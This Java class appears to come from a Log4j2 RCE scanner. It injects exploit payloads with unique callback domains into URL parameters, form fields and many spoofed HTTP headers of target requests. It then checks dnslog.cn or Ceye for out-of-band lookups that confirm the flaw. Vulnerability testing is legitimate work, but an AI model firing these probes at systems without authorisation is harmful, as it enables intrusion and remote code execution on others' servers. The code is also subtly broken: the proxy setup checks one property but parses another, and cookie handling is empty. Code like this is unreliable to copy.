package cn.xxx.crawler;

import cn.hutool.http.HttpUtil;
import cn.xxx.backend.IBackend;
import cn.xxx.backend.platform.DnslogCN;
import cn.xxx.backend.platform.*;
import cn.xxx.entity.ConstEnum;
import cn.xxx.entity.RequestInfo;
import cn.xxx.entity.ScanItem;
import cn.xxx.poc.IPOC;
import cn.xxx.poc.impl.*;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpHeaders;
import org.springframework.http.RequestEntity;
import org.springframework.http.client.SimpleClientHttpRequestFactory;
import org.springframework.scheduling.annotation.Async;
import org.springframework.scheduling.annotation.AsyncResult;
import org.springframework.stereotype.Component;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URI;
import java.nio.charset.Charset;
import java.util.*;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;
import java.util.stream.Collectors;

@Slf4j
@Component
public class MakeRequest {

    @Autowired
    private RestTemplate restTemplate;

    private IBackend backend;

    private IPOC[] pocs;

    private final String[] HEADER_BLACKLIST = new String[]{
            "content-length",
            "cookie",
            "host",
            "content-type",
            "Accept",
            "Upgrade-Insecure-Requests"
    };

    private final String[] HEADER_GUESS = new String[]{
            "User-Agent",
            "Referer",
            "X-Client-IP",
            "X-Remote-IP",
            "X-Remote-Addr",
            "X-Forwarded-For",
            "X-Originating-IP",
            "Originating-IP",
            "CF-Connecting_IP",
            "True-Client-IP",
            "Originating-IP",
            "X-Real-IP",
            "Forwarded",
            "X-Api-Version",
            "X-Wap-Profile",
            "Contact"
    };

    public MakeRequest() {
        if (System.getProperty("backend") == null || System.getProperty("backend").length() == 0) {
            log.error("use dnslog default!");
            backend = new DnslogCN();
        } else if(System.getProperty("backend").equals("dnslog")){
            log.error("use dnslog!");
            backend = new DnslogCN();
        } else if(System.getProperty("backend").equals("ceye")) {
            log.error("use Ceye!");
            backend = new Ceye();
        } else {
            log.error("unsupport backend!");
            System.exit(0);
        }

        this.pocs = new IPOC[]{new POC1(), new POC2(), new POC3(), new POC4(), new POC11()};
    }

    @Async
    public Future<Map<String, ScanItem>> doPOC(List<RequestInfo> requests) {
        proxy();
        Map<String, ScanItem> domainMap = new HashMap<>();
        for (RequestInfo reqest : requests) {
            domainMap.putAll(paramsFuzz(reqest));
            domainMap.putAll(headerFuzz(reqest));
        }

        return new AsyncResult<>(domainMap);
    }

    private Map<String, ScanItem> paramsFuzz(RequestInfo req) {
        RequestEntity<MultiValueMap<String, String>> requestEntity = req.getRequestEntity();
        Map<String, ScanItem> domainMap = new HashMap<>();
        for (IPOC poc : getSupportedPOCs()) {
            try {
                String tmpDomain = backend.getNewPayload();
                String exp = (poc.generate(tmpDomain));
                MultiValueMap<String, String> body = requestEntity.getBody();
                String url = requestEntity.getUrl().toString();

                switch (req.getParam_type()) {
                    case ConstEnum.PARAM_URL:
                        Map<String, String> url_params = HttpUtil.decodeParamMap(url, Charset.defaultCharset());
                        for (String key : url_params.keySet()) {
                            String value = url_params.get(key);
                            url_params.replace(key, exp);
                            String new_url = url.substring(0, url.indexOf("?") + 1) + urlencodeForTomcat(HttpUtil.toParams(url_params));
                            RequestEntity<MultiValueMap<String, String>> tmpReq = new RequestEntity<>(null, requestEntity.getHeaders(), requestEntity.getMethod(), URI.create(new_url));

                            try {
                                String resp = restTemplate.exchange(tmpReq, String.class).getBody();
                                domainMap.put(tmpDomain, new ScanItem(key, tmpReq, resp));
                            }catch (Exception e) {
                                log.error(e.getMessage());
                            }
                            url_params.replace(key, value);
                        }
                        break;
                    case ConstEnum.PARAM_BODY:
                        for (String key : body.keySet()) {
                            String value = body.getFirst(key);
                            body.set(key, exp);
                            try {
                                String resp = restTemplate.exchange(requestEntity, String.class).getBody();
                                domainMap.put(tmpDomain, new ScanItem(key, requestEntity, resp));
                            }catch (Exception e) {
                                log.error(e.getMessage());
                            }
                            body.set(key, value);
                        }
                        break;
                    case ConstEnum.PARAM_COOKIE:
                }

            } catch (Exception ex) {
                log.warn(ex.getMessage());
            }
        }
        return domainMap;
    }

    private Map<String, ScanItem> headerFuzz(RequestInfo req) {
        HttpHeaders headers = req.getRequestEntity().getHeaders();
        Map<String, ScanItem> domainMap = new HashMap<>();

        List<String> guessHeaders = new ArrayList(Arrays.asList(HEADER_GUESS));
        for (String key : headers.keySet()) {
            if (Arrays.stream(HEADER_BLACKLIST).noneMatch(h -> h.equalsIgnoreCase(key))) {
                List<String> needSkipheader = guessHeaders.stream().filter(h -> h.equalsIgnoreCase(key)).collect(Collectors.toList());
                needSkipheader.forEach(guessHeaders::remove);
                for (IPOC poc : getSupportedPOCs()) {
                    HttpHeaders tmpHeaders = new HttpHeaders();
                    headers.forEach( (k, v) -> { if(!key.equals(k)) {tmpHeaders.put(k, v);} });
                    String tmpDomain = backend.getNewPayload();

                    try {
                        List<String> tmpList = new ArrayList<>();
                        tmpList.add(poc.generate(tmpDomain));
                        tmpHeaders.put(key, tmpList);
                        RequestEntity tmpReq = new RequestEntity(req.getRequestEntity().getBody(), tmpHeaders, req.getRequestEntity().getMethod(), req.getRequestEntity().getUrl());
                        String resp = restTemplate.exchange(tmpReq, String.class).getBody();
                        domainMap.put(tmpDomain, new ScanItem(key, tmpReq, resp));
                    }catch (Exception e) {
                        log.warn(e.getMessage());
                    }
                }
            }
        }
        for (String headerName : guessHeaders) {
            for (IPOC poc : getSupportedPOCs()) {
                HttpHeaders tmpHeaders = new HttpHeaders();
                headers.forEach( (k, v) -> { if(!headerName.equals(k)) {tmpHeaders.put(k, v);} });
                String tmpDomain = backend.getNewPayload();

                try {
                    List<String> tmpList = new ArrayList<>();
                    tmpList.add(poc.generate(tmpDomain));
                    tmpHeaders.put(headerName, tmpList);
                    RequestEntity tmpReq = new RequestEntity(req.getRequestEntity().getBody(), tmpHeaders, req.getRequestEntity().getMethod(), req.getRequestEntity().getUrl());
                    String resp = restTemplate.exchange(tmpReq, String.class).getBody();
                    domainMap.put(tmpDomain, new ScanItem(headerName, tmpReq, resp));
                } catch (Exception e) {
                    log.warn(e.getMessage());
                }
            }
        }
        return domainMap;
    }

    private Collection<IPOC> getSupportedPOCs() {
        return Arrays.stream(pocs).filter(p -> Arrays.stream(backend.getSupportedPOCTypes()).anyMatch(c -> c == p.getType())).collect(Collectors.toList());
    }

    private String urlencodeForTomcat(String exp) {
        exp = exp.replace(":", "%3a");
        return exp;
    }

    private void proxy() {
        // 使用代理
        if (System.getProperty("prox") != null) {
            String[] proxyAddr = System.getProperty("backend").split(":");
            log.info("use proxy: {} {}", proxyAddr[0], proxyAddr[1]);
            SimpleClientHttpRequestFactory requestFactory = new SimpleClientHttpRequestFactory();
            requestFactory.setProxy(
                    new Proxy(
                            Proxy.Type.SOCKS,
                            new InetSocketAddress(proxyAddr[0], Integer.parseInt(proxyAddr[1]))  //设置代理服务
                    )
            );
            restTemplate.setRequestFactory(requestFactory);
        }
    }

    public void finalCheck(Future<Map<String, ScanItem>> future) throws ExecutionException, InterruptedException {
        while (true) {
            if (future.isDone()) {
                Thread.sleep(30000);
                Map<String, ScanItem> domainMap = future.get();
                if (backend.flushCache(domainMap.size())) {
                    for (Map.Entry<String, ScanItem> domainItem :
                            domainMap.entrySet()) {
                        ScanItem item = domainItem.getValue();
                        boolean hasIssue = backend.CheckResult(domainItem.getKey());
                        if (hasIssue) {
                            RequestEntity requestEntity = item.getRequestEntity();
                            log.error("Log4j2 RCE Detected: \n{} \n{}", requestEntity.getUrl(), requestEntity.toString());
                        }
                    }
                } else {
                    log.error("get backend result failed!\r\n");
                }
                break;
            }
        }
    }
}
